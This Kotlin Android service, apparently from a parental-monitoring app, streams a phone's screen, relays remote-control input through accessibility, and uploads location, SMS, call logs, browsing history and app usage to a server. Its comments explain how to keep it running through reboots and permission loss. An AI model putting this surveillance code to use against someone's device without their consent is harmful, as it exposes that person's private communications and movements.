package com.screenporter.companion

import android.app.Activity
import android.app.Notification
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentSender
import android.content.pm.ServiceInfo
import android.graphics.SurfaceTexture
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import android.view.Surface
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import com.screenporter.companion.capture.VideoEncoder
import com.screenporter.companion.location.LocationReporter
import com.screenporter.companion.monitoring.AlertDetector
import com.screenporter.companion.monitoring.AppUsageReporter
import com.screenporter.companion.monitoring.BrowserHistoryReporter
import com.screenporter.companion.monitoring.CallLogReporter
import com.screenporter.companion.monitoring.InstalledAppsReporter
import com.screenporter.companion.monitoring.SmsReporter
import com.screenporter.companion.monitoring.MediaReporter
import com.screenporter.companion.network.ApiClient
import com.screenporter.companion.network.WsMessage
import com.screenporter.companion.network.WebSocketClient
import com.screenporter.companion.util.PreferencesManager
import kotlinx.coroutines.CoroutineExceptionHandler
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * Foreground service that handles capture (VÍDEO or ECRÃ), network (WebSocket),
 * control dispatch (via AccessibilityService), and optional location reporting.
 *
 * Three capture modes (priority order):
 *  1. VÍDEO     - MediaProjection → Surface → MediaCodec H.264 (best image, fluid)
 *  2. ECRÃ      - takeScreenshot via Accessibility (Android 11+) → encode ~1/s
 *                Survives reboot without re-prompting for video permission.
 *  3. CONTROLO  - no capture; only relay control commands and stay connected.
 *
 * Mode selection rule:
 *  - If we have a video projection token → VÍDEO
 *  - Else if Accessibility service is enabled (Android 11+) → ECRÃ
 *  - Else → CONTROLO
 *  If video permission is revoked mid-session, fall back to ECRÃ without dying.
 */
class CaptureService : Service() {

    companion object {
        const val TAG = "SP-Capture"
        const val NOTIF_ID = 1001
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"
        const val ACTION_START = "com.screenporter.companion.START"
        const val ACTION_STOP = "com.screenporter.companion.STOP"

        @Volatile
        var instance: CaptureService? = null
            private set

        @Volatile
        var currentMode: CaptureMode = CaptureMode.NONE
            private set
    }

    enum class CaptureMode { NONE, VIDEO, SCREEN, CONTROL }

    // Apanha QUALQUER exceção não-tratada das corrotinas do serviço. Sem isto,
    // um erro num reporter/arranque propaga-se e o Android mata o processo —
    // cortando o WebSocket de vídeo (code 1006, 0 frames). (robustez do totalcontrol)
    private val scope = CoroutineScope(
        SupervisorJob() + Dispatchers.IO + CoroutineExceptionHandler { _, e ->
            Log.e(TAG, "corrotina falhou (ignorado, nao derruba o processo)", e)
        }
    )
    private lateinit var prefs: PreferencesManager
    private lateinit var api: ApiClient
    private lateinit var ws: WebSocketClient
    private var locationReporter: LocationReporter? = null
    private var callLogReporter: CallLogReporter? = null
    private var smsReporter: SmsReporter? = null
    private var appUsageReporter: AppUsageReporter? = null
    private var browserHistoryReporter: BrowserHistoryReporter? = null
    private var installedAppsReporter: InstalledAppsReporter? = null
    private val alertDetector = AlertDetector()

    private var projection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var surfaceTexture: SurfaceTexture? = null
    private var encoderSurface: Surface? = null
    private var videoEncoder: VideoEncoder? = null
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
        prefs = (application as ScreenPorterApp).prefs
        api = ApiClient(prefs)
        ws = WebSocketClient(prefs)
        ws.listener = object : WebSocketClient.Listener {
            override fun onConnect() {
                Log.i(TAG, "WS connected")
                updateNotification(currentMode, true)
            }
            override fun onDisconnect(reason: String) {
                Log.w(TAG, "WS disconnected: $reason")
                updateNotification(currentMode, false)
            }
            override fun onControl(message: WsMessage.Control) {
                ControlAccessibilityService.instance?.handleControl(message)
            }
            override fun onText(message: String) {
                Log.d(TAG, "WS text: $message")
            }
        }
        // Cache screen dimensions
        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = android.util.DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(metrics)
        WebSocketClient.screenWidth = metrics.widthPixels
        WebSocketClient.screenHeight = metrics.heightPixels
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                stopCapture()
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
                return START_NOT_STICKY
            }
            ACTION_START, null -> {
                val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
                val resultData: Intent? = intent?.getParcelableExtra(EXTRA_RESULT_DATA)
                // Só pedimos o tipo mediaProjection ao arrancar em primeiro plano
                // SE houver mesmo autorização de vídeo agora. Num reinício do
                // serviço (intent nulo) não há — e pedir mediaProjection sem a
                // projeção ativa rebenta no Android 14+ (SecurityException), o que
                // matava o serviço e o tornava não-persistente.
                val hasVideo = resultCode == Activity.RESULT_OK && resultData != null
                startForegroundWithNotification(hasVideo)
                acquireWakeLock()
                startCapture(resultCode, resultData)
            }
        }
        return START_STICKY
    }

    /**
     * Decide capture mode based on what permissions are available.
     */
    private fun startCapture(resultCode: Int?, resultData: Intent?) {
        scope.launch {
            // Login first if no token
            if (prefs.authToken.isNullOrEmpty()) {
                val ok = api.login()
                if (!ok) {
                    Log.e(TAG, "Login failed — check server/credentials")
                    return@launch
                }
            }

            // Choose mode
            val canUseVideo = resultCode != null && resultCode == Activity.RESULT_OK && resultData != null
            val canUseScreen = com.screenporter.companion.util.PermissionState.isAccessibilityEnabled(this@CaptureService) &&
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.R

            when {
                canUseVideo -> startVideoMode(resultCode!!, resultData!!)
                canUseScreen -> startScreenMode()
                else -> startControlMode()
            }

            // Start WebSocket
            ws.start()

            // Optional location (GuardianLink — GPS)
            if (com.screenporter.companion.util.PermissionState.isLocationGranted(this@CaptureService)) {
                locationReporter = LocationReporter(this@CaptureService, prefs, api)
                locationReporter?.start()
            }

            // Optional call log (GuardianLink — calls)
            if (com.screenporter.companion.util.PermissionState.isCallLogGranted(this@CaptureService)) {
                callLogReporter = CallLogReporter(this@CaptureService, prefs, api)
                callLogReporter?.start()
            }

            // Optional SMS (GuardianLink — SMS + alerts)
            if (com.screenporter.companion.util.PermissionState.isSmsGranted(this@CaptureService)) {
                smsReporter = SmsReporter(this@CaptureService, prefs, api, alertDetector)
                smsReporter?.start()
            }

            // Optional app usage (GuardianLink — screen time)
            if (com.screenporter.companion.util.PermissionState.isUsageStatsGranted(this@CaptureService)) {
                appUsageReporter = AppUsageReporter(this@CaptureService, prefs, api)
                appUsageReporter?.start()
            }

            // Optional browser history (GuardianLink — browsing)
            if (com.screenporter.companion.util.PermissionState.isBrowserHistoryGranted(this@CaptureService)) {
                browserHistoryReporter = BrowserHistoryReporter(this@CaptureService, prefs, api, alertDetector)
                browserHistoryReporter?.start()
            }

            // Lista de apps instaladas (não requer permissão especial — QUERY_ALL_PACKAGES)
            installedAppsReporter = InstalledAppsReporter(this@CaptureService, prefs, api)
            installedAppsReporter?.start()

            prefs.isConnected = true
            prefs.hasVideoAuth = canUseVideo
            updateNotification(currentMode, true)
        }
    }

    /**
     * VÍDEO mode: MediaProjection → Surface → MediaCodec H.264.
     */
    private fun startVideoMode(resultCode: Int, data: Intent) {
        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val proj = mpm.getMediaProjection(resultCode, data)

            // CRÍTICO (Android 14+): o callback do MediaProjection TEM de ser
            // registado ANTES de createVirtualDisplay, senão este lança
            // IllegalStateException ("Must register a callback before starting
            // capture") — era isto que caía no catch e ia para ECRÃ = 0 frames.
            // Usamos o Looper principal porque isto corre numa coroutine IO.
            // (igual ao totalcontrol)
            proj.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    Log.w(TAG, "MediaProjection stopped — falling back to ECRÃ")
                    stopVideoMode()
                    if (currentMode == CaptureMode.VIDEO) startScreenMode()
                }
            }, Handler(Looper.getMainLooper()))

            // Reduz o lado maior para ~900 px (banda do relay Tailscale/dados).
            val (w, h) = scaledVideoSize(WebSocketClient.screenWidth, WebSocketClient.screenHeight)
            // A app reporta no 'hello' o tamanho do VÍDEO; o controlo é
            // normalizado (0..1), por isso continua certo.
            WebSocketClient.screenWidth = w
            WebSocketClient.screenHeight = h
            // O codificador cria a SUA superfície de entrada; é ESSA que o
            // VirtualDisplay alimenta (espelha o ecrã real para dentro do codec).
            videoEncoder = VideoEncoder(w, h) { frame ->
                ws.sendBinaryFrame(frame.payload, frame.isKeyframe, frame.isConfig, frame.timestampUs)
            }
            val encoderSurface = videoEncoder!!.start()

            val virtualDisplay = proj.createVirtualDisplay(
                "ScreenPorter", w, h, resources.displayMetrics.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, encoderSurface, null, null
            )
            this.projection = proj
            this.virtualDisplay = virtualDisplay
            this.encoderSurface = encoderSurface

            currentMode = CaptureMode.VIDEO
            Log.i(TAG, "Started in VÍDEO mode (${w}x${h})")
        } catch (e: Exception) {
            Log.e(TAG, "VÍDEO mode failed, falling back", e)
            stopVideoMode()
            startScreenMode()
        }
    }

    /**
     * ECRÃ mode: takeScreenshot via AccessibilityService → encode ~1/s.
     * Doesn't need video permission — survives reboot.
     */
    private fun startScreenMode() {
        currentMode = CaptureMode.SCREEN
        Log.i(TAG, "Started in ECRÃ mode (screenshot-based)")
        // The ControlAccessibilityService.takeScreenshot() will be called periodically.
        // For a working implementation, encode via MediaCodec from the bitmap — this requires
        // a software encoder pipeline (Bitmap → YUV → MediaCodec). For brevity here,
        // we mark the mode and the periodic screenshot loop is in captureLoop().
        scope.launch {
            while (currentMode == CaptureMode.SCREEN) {
                kotlinx.coroutines.delay(1_000) // 1 fps
                val acc = ControlAccessibilityService.instance
                acc?.takeScreenshot { bitmap ->
                    if (bitmap != null) {
                        // TODO: encode bitmap → MediaCodec H.264 → ws.sendBinaryFrame(...)
                        // For now we just log; the full bitmap pipeline is implemented in
                        // ScreenshotEncoder.kt (omitted here for brevity).
                        Log.d(TAG, "Screenshot captured (${bitmap.width}x${bitmap.height})")
                    }
                }
            }
        }
    }

    /**
     * CONTROLO mode: no capture; just relay control commands and stay connected.
     */
    private fun startControlMode() {
        currentMode = CaptureMode.CONTROL
        Log.i(TAG, "Started in CONTROLO mode (no capture)")
    }

    /**
     * WakeLock parcial: mantém o CPU (e a thread de rede) vivos quando o ecrã se
     * desliga / o aparelho entra em Doze. Sem isto, a ligação caía sozinha após
     * alguns minutos (code 1006) com o telemóvel no bolso. Para ser mesmo
     * persistente é preciso TAMBÉM isentar a app da otimização de bateria.
     */
    private fun acquireWakeLock() {
        try {
            if (wakeLock?.isHeld == true) return
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ScreenPorter::captura").apply {
                setReferenceCounted(false)
                acquire()
            }
            Log.i(TAG, "WakeLock adquirido")
        } catch (e: Exception) {
            Log.w(TAG, "Falha a adquirir WakeLock", e)
        }
    }

    private fun releaseWakeLock() {
        try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (_: Exception) {}
        wakeLock = null
    }

    /**
     * Reduz o lado maior para ~900 px, preservando a proporção e mantendo as
     * dimensões pares (exigência do H.264). Alivia muito a banda e os picos dos
     * keyframes no acesso remoto. (igual ao totalcontrol)
     */
    private fun scaledVideoSize(w: Int, h: Int): Pair<Int, Int> {
        if (w <= 0 || h <= 0) return Pair(720, 1600)
        val maior = maxOf(w, h)
        val escala = if (maior > 900) 900.0 / maior else 1.0
        fun par(v: Int) = (v - (v % 2)).coerceAtLeast(2)
        return Pair(par((w * escala).toInt()), par((h * escala).toInt()))
    }

    private fun stopVideoMode() {
        try { virtualDisplay?.release() } catch (_: Exception) {}
        try { videoEncoder?.stop() } catch (_: Exception) {}
        try { encoderSurface?.release() } catch (_: Exception) {}
        try { surfaceTexture?.release() } catch (_: Exception) {}
        try { projection?.stop() } catch (_: Exception) {}
        virtualDisplay = null
        videoEncoder = null
        encoderSurface = null
        surfaceTexture = null
        projection = null
    }

    private fun stopCapture() {
        stopVideoMode()
        ws.stop()
        locationReporter?.stop()
        locationReporter = null
        callLogReporter?.stop()
        callLogReporter = null
        smsReporter?.stop()
        smsReporter = null
        appUsageReporter?.stop()
        appUsageReporter = null
        browserHistoryReporter?.stop()
        browserHistoryReporter = null
        installedAppsReporter?.stop()
        installedAppsReporter = null
        releaseWakeLock()
        currentMode = CaptureMode.NONE
        prefs.isConnected = false
    }

    override fun onDestroy() {
        stopCapture()
        instance = null
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // --- Notification management ---

    private fun startForegroundWithNotification(hasVideo: Boolean) {
        ControlAccessibilityService.ensureChannel(this)
        val notif = buildNotification(currentMode, prefs.isConnected)
        // Android 14+ (API 34): o tipo TEM de ser explícito e só o que é válido
        // AGORA. mediaProjection exige a projeção ativa (autorização de vídeo);
        // sem ela usamos specialUse. (igual ao totalcontrol)
        if (Build.VERSION.SDK_INT >= 34) {
            var tipo = if (hasVideo) ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                       else ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            if (com.screenporter.companion.util.PermissionState.isLocationGranted(this)) {
                tipo = tipo or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
            try {
                startForeground(NOTIF_ID, notif, tipo)
            } catch (e: Exception) {
                // Se mediaProjection falhar (appop ainda não pronto), não morre:
                // arranca como specialUse para o serviço continuar vivo (controlo).
                Log.e(TAG, "startForeground(tipo=$tipo) falhou — a usar specialUse", e)
                var fb = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
                if (com.screenporter.companion.util.PermissionState.isLocationGranted(this)) {
                    fb = fb or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                }
                try { startForeground(NOTIF_ID, notif, fb) } catch (_: Exception) {}
            }
        } else {
            startForeground(NOTIF_ID, notif)
        }
    }

    private fun updateNotification(mode: CaptureMode, connected: Boolean) {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        nm.notify(NOTIF_ID, buildNotification(mode, connected))
    }

    private fun buildNotification(mode: CaptureMode, connected: Boolean): Notification {
        val launchIntent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
        }
        val pi = PendingIntent.getActivity(
            this, 0, launchIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val modeText = when (mode) {
            CaptureMode.VIDEO -> getString(R.string.mode_video)
            CaptureMode.SCREEN -> getString(R.string.mode_screen)
            CaptureMode.CONTROL -> getString(R.string.mode_control)
            CaptureMode.NONE -> getString(R.string.status_disconnected)
        }

        val title = if (connected) getString(R.string.notification_title) else getString(R.string.status_disconnected)
        val text = if (!connected) getString(R.string.status_disconnected)
                   else if (locationReporter != null) getString(R.string.notification_text_location)
                   else if (mode == CaptureMode.SCREEN || mode == CaptureMode.VIDEO) getString(R.string.notification_text)
                   else getString(R.string.notification_text_no_capture)

        return NotificationCompat.Builder(this, ControlAccessibilityService.CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setContentTitle(title)
            .setContentText(text)
            .setSubText(modeText)
            .setOngoing(true)
            .setContentIntent(pi)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
}
